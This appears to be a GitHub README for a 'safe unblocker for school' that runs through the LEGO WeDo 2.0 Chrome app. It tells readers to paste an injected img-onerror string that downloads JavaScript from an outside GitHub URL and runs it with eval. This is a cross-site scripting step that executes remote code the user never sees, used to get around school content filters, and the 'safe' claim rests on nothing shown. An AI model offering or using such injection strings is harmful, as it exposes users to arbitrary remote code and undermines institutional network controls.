# Safe-Unblocker-For-School
This is a safe unblocker for school that uses LEGO Wedo 2.0 . The app uses your microphone, so make sure to turn that off if desired. Credits to @Blobby-Boi


Setup:


First, install WeDo 2.0 LEGOÂ® Education from the Chrome Webstore.

Once you are in the project, click on the pencil in the top bar.

Then, click the green document button.

In the textbox, paste the following string:

img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '

Unblocked!
